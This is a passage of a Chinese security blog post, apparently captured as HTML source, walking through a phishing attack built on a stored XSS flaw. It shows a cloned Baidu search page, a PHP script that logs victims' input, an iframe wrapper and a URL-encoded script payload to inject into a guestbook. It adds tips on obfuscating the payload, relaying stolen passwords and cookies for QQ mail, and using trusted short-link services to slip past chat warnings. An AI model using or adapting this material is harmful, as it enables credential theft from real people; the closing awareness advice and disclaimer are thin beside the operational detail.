class="hljs-number">0.3</span>;</span><br><span class="css"> 	<span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;</span><br><span class="css"> 	<span class="hljs-attribute">display</span>: none;</span><br> 	&#125;<br> 	.login&#123;<br><span class="css"> 	<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="css"> 	<span class="hljs-attribute">width</span>: <span class="hljs-number">390px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">height</span>: <span class="hljs-number">500px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> 	<span class="hljs-attribute">top</span>:<span class="hljs-number">26%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">left</span>: <span class="hljs-number">35%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">background-color</span>:white;</span><br><span class="css"> 	<span class="hljs-attribute">z-index</span>: <span class="hljs-number">110</span>;</span><br><span class="css"> 	<span class="hljs-attribute">display</span>: none;</span><br> 	&#125;<br> 	.login-top&#123;<br><span class="css"> 	<span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> 	<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">height</span>: <span class="hljs-number">10%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">background-color</span>:white;</span><br> 	&#125;<br> 	.close-login&#123;<br><span class="css"> 	<span class="hljs-attribute">display</span>: block;</span><br><span class="css"> 	<span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> 	<span class="hljs-attribute">right</span>: <span class="hljs-number">10px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">top</span>: <span class="hljs-number">5px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">width</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">text-align</span>: center;</span><br><span class="css"> 	<span class="hljs-attribute">line-height</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">color</span>: gray;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-selector-class">.close-login</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid gray;</span><br><span class="css"> 	<span class="hljs-attribute">cursor</span>: pointer;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-selector-class">.login-top</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">cursor</span>: move;</span><br> 	&#125;<br> 	 <br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;800px&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;10%&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;aa&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>新闻<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>hao123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>地图<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>视频<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>贴吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>学术<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tt&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;login()&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>设置<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;&quot;</span>&gt;</span>更多产品<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;40%&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/baidu001.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;270px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;129px&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>	<br> 	<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;baidu.php&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wd&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 540px;height: 36px;font-size: 20px;&quot;</span>/&gt;</span><br> 	<span class="hljs-comment">&lt;!-- &lt;img src=&quot;image/camera#.png&quot; /&gt; --&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;&quot;</span>&gt;</span>百度一下<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/loading.gif&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>手机百度<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dd&quot;</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>把百度设为主页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>关于百度<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>About Baidu<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>百度推广<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dd&quot;</span>&gt;</span><br> 	◎2018 Baidu <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>使用百度前必读<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>意见反馈<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>京ICP证030173号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/jing01.png&quot;</span> /&gt;</span> 京公网安备110000002000001号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/jing01.png&quot;</span>/&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> 	 <br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br> 	<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$wd</span> = urlencode(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;wd&#x27;</span>]);<br><span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;baidu_search.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$log</span>, <span class="hljs-variable">$wd</span> . <span class="hljs-string">&quot;\r\n&quot;</span>);<br>fclose(<span class="hljs-variable">$log</span>);<br><br><span class="hljs-comment">#echo $wd;</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot;&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;location.href=&#x27;https://www.baidu.com/s?wd=&quot;</span>.<span class="hljs-variable">$wd</span>.<span class="hljs-string">&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>百度页面目前的样子：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11.png" srcset="/img/loading.gif" lazyload></p>
+<p>ps:其中baidu.html中用到的图片我放到github上面了 <a target="_blank" rel="noopener" href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p>
+<p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此环境搭建完成。</p>
+<h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p>
+<p>那么我们先写一个调用baidu.html的iframe.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>百度一下，你就知道<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css">      <span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">	  <span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">	  <span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;</span><br>  &#125;<br><span class="css"><span class="hljs-selector-tag">iframe</span>&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/xss/hk/baidu.html&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframepage&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframepage&quot;</span>  <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;101%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;101%&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p>
+<p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p>
+<p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(<span class="hljs-string">&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;</span>))&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing12.png" srcset="/img/loading.gif" lazyload></p>
+<p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p>
+<p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing13.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候我们搜索：黑暗剑21</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing14.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing15.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing16.png" srcset="/img/loading.gif" lazyload></p>
+<p>解码之后就是黑暗剑21。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing17.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此我们一个完整的钓鱼流程就结束了。</p>
+<h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul>
+<li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p>
+</li>
+<li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p>
+</li>
+<li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p>
+</li>
+</ul>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p>
+<p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/">网络钓鱼</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/05/24/php-curl%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php curl方法总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell/">
+                        <span class="hidden-mobile">数据库备份getshell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
